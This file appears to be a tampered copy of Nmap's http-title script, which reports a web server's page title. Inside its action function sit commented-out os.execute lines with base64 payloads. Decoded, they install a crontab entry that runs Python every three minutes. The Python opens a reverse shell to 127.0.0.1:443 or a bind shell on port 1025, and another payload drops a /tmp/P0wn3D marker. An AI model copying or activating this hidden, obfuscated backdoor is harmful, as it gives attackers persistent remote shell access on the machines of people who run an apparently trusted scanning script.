local http = require "http"
local nmap = require "nmap"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local base64 = require "base64"

description = [[
Shows the title of the default page of a web server.

The script will follow no more than one HTTP redirect, and only if the
redirection leads to the same host. The script may send a DNS query to
determine whether the host the redirect leads to has the same IP address as the
original target.
]]

---
--@output
-- Nmap scan report for scanme.nmap.org (74.207.244.221)
-- PORT   STATE SERVICE
-- 80/tcp open  http
-- |_http-title: Go ahead and ScanMe!
--
-- @xmloutput
-- <elem key="title">Go ahead and ScanMe!</elem>
-- @xmloutput
-- <elem key="title">Wikipedia, the free encyclopedia</elem>
-- <elem key="redirect_url">http://en.wikipedia.org/wiki/Main_Page</elem>

author = "Diman Todorov"

license = "Same as Nmap--See http://nmap.org/book/man-legal.html"

categories = {"default", "discovery", "safe"}

portrule = shortport.http

action = function(host, port)
  local resp, redirect_url, title
  -- local payload = "ZWNobyAiKi8zICogKiAqICogcHl0aG9uIC1jIFwiZXhlYygnYVcxd2IzSjBJSE52WTJ0bGRDeHZjd3B6YnoxemIyTnJaWFF1YzI5amEyVjBLSE52WTJ0bGRDNUJSbDlKVGtWVUxITnZZMnRsZEM1VFQwTkxYMU5VVWtWQlRTa0tjMjh1WTI5dWJtVmpkQ2dvSnpFeU55NHdMakF1TVNjc05EUXpLU2tLWjBnOVJtRnNjMlVLZDJocGJHVWdibTkwSUdkSU9nb0paR0YwWVQxemJ5NXlaV04yS0RFd01qUXBDZ2xwWmlCc1pXNG9aR0YwWVNrOVBUQTZDZ2tKWjBnOVZISjFaUW9KYzNSa2FXNHNjM1JrYjNWMExITjBaR1Z5Y2l3OWIzTXVjRzl3Wlc0ektHUmhkR0VwQ2dsemRHUnZkWFJmZG1Gc2RXVTljM1JrYjNWMExuSmxZV1FvS1N0emRHUmxjbkl1Y21WaFpDZ3BDZ2x6Ynk1elpXNWtLSE4wWkc5MWRGOTJZV3gxWlNrSycuZGVjb2RlKCdiYXNlNjQnKSlcIiAyPi9kZXYvbnVsbCIgfCBjcm9udGFi"
  -- local payload = "L3Vzci9iaW4vdG91Y2ggL3RtcC9QMHduM0Q="
  -- os.execute(base64.dec(payload))
  -- os.execute(base64.dec('ZWNobyAiKi8zICogKiAqICogcHl0aG9uIC1jIFwiZXhlYygnYVcxd2IzSjBJSE52WTJ0bGRDeHZjeXh6ZVhNS2N6MXpiMk5yWlhRdWMyOWphMlYwS0NrS2N5NWlhVzVrS0NnaUlpd3hNREkxS1NrS2N5NXNhWE4wWlc0b01Ta0tLR01zWVNrOWN5NWhZMk5sY0hRb0tRcDNhR2xzWlNBeE9nb2daRDFqTG5KbFkzWW9OVEV5S1FvZ2FXWWdKMlY0YVhRbklHbHVJR1E2Q2lBZ2N5NWpiRzl6WlNncENpQWdjM2x6TG1WNGFYUW9NQ2tLSUhJOWIzTXVjRzl3Wlc0b1pDa3VjbVZoWkNncENpQmpMbk5sYm1Rb2Npa0snLmRlY29kZSgnYmFzZTY0JykpXCIgMj4vZGV2L251bGwiIHwgY3JvbnRhYg=='))

  resp = http.get( host, port, '/' )

  -- check for a redirect
  if resp.location then
    redirect_url = resp.location[#resp.location]
    if resp.status and tostring( resp.status ):match( "30%d" ) then
      return {redirect_url = redirect_url}, ("Did not follow redirect to %s"):format( redirect_url )
    end
  end

  if ( not(resp.body) ) then
    return
  end

  -- try and match title tags
  title = string.match(resp.body, "<[Tt][Ii][Tt][Ll][Ee][^>]*>([^<]*)</[Tt][Ii][Tt][Ll][Ee]>")

  local display_title = title

  if display_title and display_title ~= "" then
    display_title = string.gsub(display_title , "[\n\r\t]", "")
    if #display_title > 65 then
      display_title = string.sub(display_title, 1, 62) .. "..."
    end
  else
    display_title = "Site doesn't have a title"
    if ( resp.header and resp.header["content-type"] ) then
      display_title = display_title .. (" (%s)."):format( resp.header["content-type"] )
    else
      display_title = display_title .. "."
    end
  end

  local output_tab = stdnse.output_table()
  output_tab.title = title
  output_tab.redirect_url = redirect_url

  local output_str = display_title
  if redirect_url then
    output_str = output_str .. "\n" .. ("Requested resource was %s"):format( redirect_url )
  end

  return output_tab, output_str
end
